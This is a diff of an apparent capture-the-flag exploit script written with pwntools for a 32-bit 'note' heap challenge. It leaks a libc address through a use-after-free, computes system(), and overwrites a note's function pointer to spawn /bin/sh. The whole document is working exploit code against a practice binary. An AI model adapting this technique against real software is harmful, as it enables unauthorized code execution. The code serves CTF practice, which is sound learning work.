@@ -5,54 +5,69 @@ import sys
 context.terminal = ['tmux','splitw','-h']
 
 gdb_bool = True
+context.m_gdb = "peda"
+context.log_level = 'debug'
 #gdb_bool = False
 
-puts_call = 0x80484D0
-read_offset = 0xD41C0
-def addNote(size,contents):
+
+def add_note(size,content):
+    r.recvuntil("Your choice :")
     r.sendline("1")
-    r.recvuntil("size :")
-    r.sendline(str(size))
-    r.recvuntil("Content :")
-    r.sendline(contents)
-    r.recvuntil("choice :")
+    r.sendlineafter("size :",str(size))
+    r.sendlineafter("Content :",str(content))
+    
 
-def deleteNote(index):
+def delete_note(idx):
+    r.recvuntil("Your choice :")
     r.sendline("2")
-    r.recvuntil("Index :")
-    r.sendline(str(index))
-    r.recvuntil("choice :")
+    r.sendlineafter("Index :",str(idx))
 
-def printNote(index):
+def print_note(idx):
+    r.recvuntil("Your choice :")
     r.sendline("3")
-    r.recvuntil("Index :")
-    r.sendline(str(index))
-    #r.recvuntil("choice :")
+    r.sendlineafter("Index :",str(idx))
+    r.recvn(4)
+    dump = u32(r.recvn(4))
+    return dump
 
-
+def exit():
+    r.sendline("4")
 
 def exploit(r):
+    #0x804a050 where pointers are stored to heap
+    #[addr to puts][addr of contents][00000000][size]
+    #[contents]
 
-    r.recvuntil("choice :")
-    addNote(20,"A"*19)
-    addNote(20,"B"*19)
-    deleteNote(0)
-    deleteNote(1)
-    buf =""
-    buf += p32(puts_call)
-    buf += "BBBB"
-    buf += "pwned"
-    #addNote(len(buf),buf)
-    addNote(8,p32(0x804862B)+p32(0x804A00C))
-    printNote(0)
-    #print r.recvn(4)
-    read_got_leak = u32(r.recvn(4))
-    base_libc = read_got_leak - read_offset
-    system = base_libc + 0x3A940
-    print("Address of system: ", hex(system))
-    deleteNote(2)
+    #r.recvuntil(":")
+    #add_note(0x20,"A"*10) #0
+    #add_note(0x20,"A"*10) #0
+    add_note(0x90,"B") #0
+    add_note(0x90,"C") #1
+    
 
-    addNote(8,p32(system)+";sh;")
+    delete_note(0)
+    
+    add_note(0x90,"D") #0
+
+    leak = print_note(0)
+    #offset = 0x1b0840
+    log.info("Leaked libc addr: %s" % hex(leak))
+    libc_base = leak -0x1b07b0
+    log.info("libc_base: %s" % hex(libc_base))
+    system = libc_base+0x3a940
+
+    delete_note(0)
+    delete_note(1)
+    add_note(0x90,p32(system)+";/bin/sh\x00")
+
+
+
+
+
+    
+
+
+
     
     #printNote(0)
     r.interactive()
@@ -71,9 +86,9 @@ if __name__ == "__main__":
         exploit(r)
     else:
         r = process(binary_name,env={"LD_PRELOAD" : "./libc_32.so.6"})
-        print util.proc.pidof(r)
+        #print util.proc.pidof(r)
         gdb_cmd = [
-            "b *0x804893D",
+            
             "c"
 
 
